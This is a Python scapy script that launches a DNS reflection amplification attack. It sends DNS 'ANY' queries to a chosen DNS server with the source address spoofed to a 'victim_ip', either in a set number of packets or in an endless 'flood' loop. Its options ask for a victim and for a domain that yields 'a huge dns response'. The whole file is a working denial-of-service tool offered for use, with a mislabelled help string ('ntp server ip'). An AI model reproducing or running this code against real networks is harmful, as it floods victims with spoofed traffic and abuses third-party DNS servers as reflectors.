#!/usr/bin/python3

from scapy.all import *
import sys
import argparse
from colorama import Fore

global GREEN, RED, YELLOW, MAGENTA, RESET
GREEN = Fore. GREEN
RED = Fore.RED
YELLOW = Fore.YELLOW
MAGENTA = Fore.MAGENTA
RESET = Fore.RESET

conf.checkIpAddr = False # To stop scapy from checking return packet originating from any packet that we have sent out

def dns_reflective(attack, dns_server_ip, victim_ip, website, num_req):

    query_type = "ANY"
    time_to_live = 128

    if attack == "test":
        print(GREEN + "[+] send "+str(num_req)+" DNS requests to " + dns_srv_ip + " with src_ip" + victim_ip + " requesting " + website + RESET)
        for i in range(0, num_req):
            send(IP(dst=dns_srv_ip, src=victim_ip, ttl=time_to_live)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname=website, qtype=query_type)), verbose=False, iface=net_interface)

    elif attack == "flood":
        print(GREEN + "[+] send continuously DNS requests to " + dns_srv_ip + " with src_ip " + victim_ip + " requesting " + website + RESET)
        while True:
            send(IP(dst=dns_srv_ip, src=victim_ip, ttl=time_to_live)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname=website, qtype=query_type)), verbose=False, iface=net_interface)

    else:
        print(RED + "[-] Please choose: test/flood" + RESET)

    return True

parser = argparse.ArgumentParser()
parser.add_argument("-t", "--type", help="test/flood")
parser.add_argument("-d", "--dns_server_ip", help="ntp server ip")
parser.add_argument("-w", "--website", help="website providing a huge dns response to the ANY requests")
parser.add_argument("-v", "--victim_ip", help="victim_ip")
parser.add_argument("-N", "--num_req", help="number of request")
parser.add_argument("-I", "--interface", help="interface(eth0, ...)")
args = parser.parse_args()

if args.type:
    type_attack = args.type

    if type_attack == "test":
        if args.num_req:
            num_request = int(args.num_req)
        else:
            num_request = 5
    else:
        num_request = 0 # means infinity of requests

if args.dns_server_ip:
    dns_srv_ip = args.dns_server_ip

if args.victim_ip:
    victim_ip = args.victim_ip

if args.website:
    website = args.website

global net_interface
if args.interface:
    net_interface = args.interface
else:
    net_interface = "eth0"

dns_reflective(type_attack, dns_srv_ip, victim_ip, website, num_request)

sys.exit(1)
